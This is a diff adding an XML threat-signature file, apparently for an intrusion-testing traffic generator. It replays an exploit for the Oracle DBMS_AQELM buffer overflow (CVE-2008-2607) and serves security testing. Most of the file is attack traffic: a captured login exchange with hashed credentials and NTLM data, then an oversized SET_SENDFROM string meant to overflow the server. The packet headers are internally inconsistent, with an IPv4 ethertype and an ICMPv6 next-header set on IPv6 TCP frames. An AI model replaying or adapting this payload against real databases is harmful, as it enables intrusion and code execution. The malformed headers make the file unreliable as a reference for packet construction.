@@ -1,0 +1,386 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle Database Server DBMS_AQELM Package Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a buffer overflow in Oracle Database Server. The vulnerability is due improper input validation of parameters sent to a procedure in the DBMS_AQELM package. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing database corruption or arbitrary code injection and execution with the privileges of the affected process. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="NCUBE-LM/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Oracle_Oracle_Database_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20080716-03"/>
+    <CVEID display="true" value="CVE-2008-2607"/>
+    <bugtraqID display="true" value="30177"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="ccc5af6d5fa75137bb1c2938918661c3"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900916"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1216834772" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="AQ"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="AR"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="AS"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="AT"/>
+    <NamedVar name="NCUBELMdestPort" type="ImperfectControls.Port" value="null" index="AU"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="E"/>
+    <for index="F">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="G"/>
+    <for index="H">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="I"/>
+    <for index="K">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="P"/>
+    <for index="R"/>
+    <for index="M">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="T"/>
+    <for index="Q">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="V"/>
+    <for index="S">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="X"/>
+    <for index="U">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="Z"/>
+    <for index="W">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="AB"/>
+    <for index="Y">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="AE"/>
+    <for index="AA">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="AG"/>
+    <for index="AD">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="AK"/>
+    <for index="AF">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="AI">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="AL">
+      <for index="AQ"/>
+      <for index="AR"/>
+      <for index="AS"/>
+      <for index="AT"/>
+      <for index="AU"/>
+    </for>
+    <for index="L"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B733B9A" AckNumber="6C708808" HeaderLength="05" WindowSize="FAF0" Checksum="AA3C" UrgentPointer="0000" Options="" Payload="01040000010000000139012C000008007FFFC60E0000010000CA003A000002006161000000000000000000000000000000000000000000000000284445534352495054494F4E3D28434F4E4E4543545F444154413D28534552564943455F4E414D453D6F72636C29284349443D2850524F4752414D3D433A5C6F7261636C655C70726F647563745C31302E322E305C64625F315C62696E5C73716C706C75732E6578652928484F53543D475358342D57494E324B5352562928555345523D41646D696E6973747261746F7229292928414444524553533D2850524F544F434F4C3D5443502928484F53543D3137322E31362E382E35382928504F52543D31353231292929" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B733C9E" AckNumber="6C708810" HeaderLength="05" WindowSize="FAE8" Checksum="A938" UrgentPointer="0000" Options="" Payload="01040000010000000139012C000008007FFFC60E0000010000CA003A000002006161000000000000000000000000000000000000000000000000284445534352495054494F4E3D28434F4E4E4543545F444154413D28534552564943455F4E414D453D6F72636C29284349443D2850524F4752414D3D433A5C6F7261636C655C70726F647563745C31302E322E305C64625F315C62696E5C73716C706C75732E6578652928484F53543D475358342D57494E324B5352562928555345523D41646D696E6973747261746F7229292928414444524553533D2850524F544F434F4C3D5443502928484F53543D3137322E31362E382E35382928504F52543D31353231292929" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B733DA2" AckNumber="6C708830" HeaderLength="05" WindowSize="FAC8" Checksum="C861" UrgentPointer="0000" Options="" Payload="00A80000060000000000DEADBEEF009E0A2001000004000004000300000000000400050A20010000080001000005DC514E08D600120001DEADBEEF00030000000400040001000100020001000500000000000400050A20010000020003E0E100020006FCFF0001000201000300004E54530002000200000000000400050A200100000C0001001106100C0F0A0B080201030003000200000000000400050A20010000030001000301" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="M" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B733EE5" AckNumber="6C7089A4" HeaderLength="05" WindowSize="F954" Checksum="8136" UrgentPointer="0000" Options="" Payload="00F10000060000000000DEADBEEF00E70A200100000100000100020000000000040001C600000000C600014E544C4D5353500003000000180018009600000018001800AE0000001A001A00480000001A001A00620000001A001A007C00000000000000C6000000058280A2050093080000000F47005300580034002D00570049004E0032004B00530052005600410064006D0069006E006900730074007200610074006F00720047005300580034002D00570049004E0032004B005300520056008465195ADF9E8BA0617FDFACF8DE610660A7A83B29ABDCAE45E7AE7BECE02B4EA1353E772AB2B86938970DC66C4A3D4D00250000060000000000010605040302010049424D50432F57494E5F4E542D382E312E3000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="Q" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B733FFB" AckNumber="6C708A57" HeaderLength="05" WindowSize="F8A1" Checksum="52F4" UrgentPointer="0000" Options="" Payload="0045000006000000000002B200B2005221060101010D01010401010101010101FFFF0308030001003F01073F010101010301050201000018800000003C3C3C80000000D007" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="S" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B734040" AckNumber="6C708A6D" HeaderLength="05" WindowSize="F88B" Checksum="118D" UrgentPointer="0000" Options="" Payload="00E9000006000000000003760290D00D01030000002100000038C3120005000000E0BF120008C51200037379730D0000000D415554485F5445524D494E414C0D0000000D475358342D57494E324B535256000000000F0000000F415554485F50524F4752414D5F4E4D0B0000000B73716C706C75732E657865000000000C0000000C415554485F4D414348494E4511000000115652545C475358342D57494E324B535256000000000800000008415554485F5049440800000008313530303A333230000000000800000008415554485F5349440D0000000D41646D696E6973747261746F7200000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="U" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B734129" AckNumber="6C708B4E" HeaderLength="05" WindowSize="F7AA" Checksum="A213" UrgentPointer="0000" Options="" Payload="0460000006000000000003730390D00D01030000002101000034EF12000D000000DCEB1200C4FB1200037379730C0000000C415554485F534553534B4559400000004030354631383446333537394337413830363245334230453633304345393842464431453437464430313031364532424439463645433741363532334533433246010000000D0000000D415554485F50415353574F5244400000004034373939413639453342393445304334313533353236373135433745313735353134413730383735333243313630383244343832354632334545373131433736000000000800000008415554485F52545405000000053336323538000000000D0000000D415554485F434C4E545F4D454D040000000434303936000000000D0000000D415554485F5445524D494E414C0D0000000D475358342D57494E324B535256000000000F0000000F415554485F50524F4752414D5F4E4D0B0000000B73716C706C75732E657865000000000C0000000C415554485F4D414348494E4511000000115652545C475358342D57494E324B535256000000000800000008415554485F5049440800000008313530303A333230000000000800000008415554485F5349440D0000000D41646D696E6973747261746F72000000000800000008415554485F41434C040000000434343030000000001200000012415554485F414C5445525F53455353494F4EE9010000FEFF414C5445522053455353494F4E20534554204E4C535F4C414E47554147453D2027414D45524943414E27204E4C535F5445525249544F52593D2027414D455249434127204E4C535F43555252454E43593D20272427204E4C535F49534F5F43555252454E43593D2027414D455249434127204E4C535F4E554D455249435F434841524143544552533D20272E2C27204E4C535F43414C454E4441523D2027475245474F5249414E27204E4C535F444154455F464F524D41543D202744442D4D4F4E2D525227204E4C535F444154455F4C414E47554147453D2027414D45524943414E27204E4C535F534F52543D202742494E415259272054494D455F5A4F4EEA453D20272D30343A303027204E4C535F434F4D503D202742494E41525927204E4C535F4455414C5F43555252454E43593D20272427204E4C535F54494D455F464F524D41543D202748482E4D492E535358464620414D27204E4C535F54494D455354414D505F464F524D41543D202744442D4D4F4E2D52522048482E4D492E535358464620414D27204E4C535F54494D455F545A5F464F524D41543D202748482E4D492E535358464620414D20545A5227204E4C535F54494D455354414D505F545A5F464F524D41543D202744442D4D4F4E2D52522048482E4D492E535358464620414D20545A52270000000000001700000017415554485F4C4F474943414C5F53455353494F4E5F494420000000204439433941424642383741323437333438374435313633393643313833363943000000001000000010415554485F4641494C4F5645525F49440000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="W" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B734589" AckNumber="6C708F3A" HeaderLength="05" WindowSize="FAF0" Checksum="E027" UrgentPointer="0000" Options="" Payload="002C0000060000000000116B04910000000800000001000000033B0594FB1200F401000070FA12006CFA1200" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="Y" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B7345B5" AckNumber="6C708FCD" HeaderLength="05" WindowSize="FA5D" Checksum="C70D" UrgentPointer="0000" Options="" Payload="003D0000060000000000036806010000000000000000000000000000000000000000000000000000000000000000000000040000004CFD120000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="AA" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B7345F2" AckNumber="6C708FE3" HeaderLength="05" WindowSize="FA47" Checksum="C5D4" UrgentPointer="0000" Options="" Payload="003D00000600000000000368070100000000000000000000000000000000000000000000000000000000000000000000000400000048FD120000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="AD" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B73462F" AckNumber="6C708FF9" HeaderLength="05" WindowSize="FA31" Checksum="8331" UrgentPointer="0000" Options="" Payload="03D80000060000000000035E082100040000000000944F0C0135030000DC4B0A010D00000000000000104C0A01000000000100000000000000000000000000000000000000000000000000000000000000124C0A0114530C01000000000000000000000000204C0A01FEFF424547494E2044424D535F4151454C4D2E5345545F53454E4446524F4D28274141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141FF414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141FF414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141384141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414127293B20454E443B0A000001000000010000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="AF" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B734A07" AckNumber="6C70920B" HeaderLength="05" WindowSize="F81F" Checksum="1457" UrgentPointer="0000" Options="" Payload="001C0000060000000000116909F0060A01010000000100000003930A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="AI" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B734A23" AckNumber="6C70921C" HeaderLength="05" WindowSize="F80E" Checksum="BBC2" UrgentPointer="0000" Options="" Payload="000D000006000000000003090B" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="AL" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B734A30" AckNumber="6C70922D" HeaderLength="05" WindowSize="F7FD" Checksum="C984" UrgentPointer="0000" Options="" Payload="000A0000060000000040" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="K" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$NCUBELMdestPort" SeqNumber="2B733E4A" AckNumber="6C7088D3" HeaderLength="05" WindowSize="FA25" Checksum="E089" UrgentPointer="0000" Options="" Payload="009B0000060000000000DEADBEEF00910A200100000100000100070000000000040005020000000004000400000000000400040000000200140001020000000400000000000000000000000000000000040001000000000004000138000000003800014E544C4D535350000100000007B200A203000300350000000D000D0028000000050093080000000F475358342D57494E324B535256565254" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3,5,7,9,11,13,15,17,19,21,23,25,28">
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708808" AckNumber="2B733C9E" HeaderLength="05" WindowSize="FEFB" Checksum="D581" UrgentPointer="0000" Options="" Payload="000800000B000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708810" AckNumber="2B733DA2" HeaderLength="05" WindowSize="FDF7" Checksum="F28F" UrgentPointer="0000" Options="" Payload="00200000020000000139000008007FFF01000000002061610000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="I" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708830" AckNumber="2B733E4A" HeaderLength="05" WindowSize="FD4F" Checksum="EE82" UrgentPointer="0000" Options="" Payload="00A30000060000000000DEADBEEF00990A2001000004000004000300000000000400050A20010000020006001F000E0001DEADBEEF000300000002000400010001000700000000000400050A20010000020006FAFF0001000201000300004E54530004000502000000000400040000000000040004000000020002000200000000000400050A20010000010002000003000200000000000400050A2001000001000200" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="P" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C7089A4" AckNumber="2B733FFB" HeaderLength="05" WindowSize="FB9E" Checksum="01D8" UrgentPointer="0000" Options="" Payload="00B3000006000000000001060049424D50432F57494E5F4E542D382E312E3000B20001000000640000006001240F050B0C030C0C0504050D0609070805050505050F05050505050A050505050504050607080823472323081123081141B023008300B207D0030000000000000000000000000000000000000000000000000000000000000000000000000021060101010D01010401010101010101FFFF0308030001003F01073F010101010301050201000118" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="R" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708A57" AckNumber="2B734040" HeaderLength="05" WindowSize="FB59" Checksum="191E" UrgentPointer="0000" Options="" Payload="0016000006000000000002800000003C3C3C80000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="T" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708A6D" AckNumber="2B734129" HeaderLength="05" WindowSize="FA70" Checksum="0D68" UrgentPointer="0000" Options="" Payload="00E100000600000000000802000C0000000C415554485F534553534B4559400000004041344433363839413734383542433144454143444530423039413943313931454134313132304636443633463934343438394638433646423336364344413944000000000D0000000D415554485F5646525F44415441000000003909000004010000000200010000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000003601000000000000E8E12F0A00000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="V" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708B4E" AckNumber="2B734589" HeaderLength="05" WindowSize="FFFF" Checksum="4E01" UrgentPointer="0000" Options="" Payload="03EC00000600000000000815001300000013415554485F56455253494F4E5F535452494E470C0000000C2D2050726F64756374696F6E000000001000000010415554485F56455253494F4E5F53514C02000000023230000000001300000013415554485F58414354494F4E5F545241495453010000000133000000000F0000000F415554485F56455253494F4E5F4E4F0900000009313639383639353638000000001300000013415554485F56455253494F4E5F535441545553010000000130000000001500000015415554485F4341504142494C4954595F5441424C4500000000000000000B0000000B415554485F44424E414D4524000000244F52434C2E524547524553532E5244424D532E4445562E55532E4F5241434C452E434F4D000000000F0000000F415554485F53455353494F4E5F49440300000003313435000000000F0000000F415554485F53455249414C5F4E554D010000000138000000001000000010415554485F494E5354414E43455F4E4F010000000131000000001000000010415554485F4641494C4F5645525F4944010000000131000000001300000013415554485F53435F5345525645525F484F535409000000096F7261636C65313067000000001500000015415554485F53435F4442554E495155455F4E414D4504000000046F72636C000000001500000015415554485F53435F494E5354414E43455F4E414D4504000000046F72636C000000001400000014415554485F53435F534552564943455F4E414D4504000000046F72636C000000001300000013415554485F53435F494E5354414E43455F4944010000000131000000001B0000001B415554485F53435F494E5354414E43455F53544152545F54494D452400000024323030382D30372D31362030393A33343A35382E303030303030303030202D30343A3030000000001100000011415554485F53435F44425F444F4D41494E00000000000000001100000011415554485F53435F5356435F464C414753010000000138000000001100000011415554485F494E5354414E43454E414D4504000000046F72636C000000001100000011415554485F5356525F524553504F4E534560000000603433303142453636413142303331324132463746394435364430433446363931453434434644434438313341333431334443304132453943353731414337334244383239343344433435454141464136383438304441464236313636464645300000000004010000000300010000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000003601000000000000E8E12F0A00000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="X" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708F3A" AckNumber="2B7345B5" HeaderLength="05" WindowSize="FFD3" Checksum="1A57" UrgentPointer="0000" Options="" Payload="00930000060000000000087A007A4F7261636C652044617461626173652031306720456E74657270726973652045646974696F6E2052656C656173652031302E322E302E312E30202D2050726F64756374696F6E0A576974682074686520506172746974696F6E696E672C204F4C415020616E642044617461204D696E696E67206F7074696F6E730001200A09010000000300" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
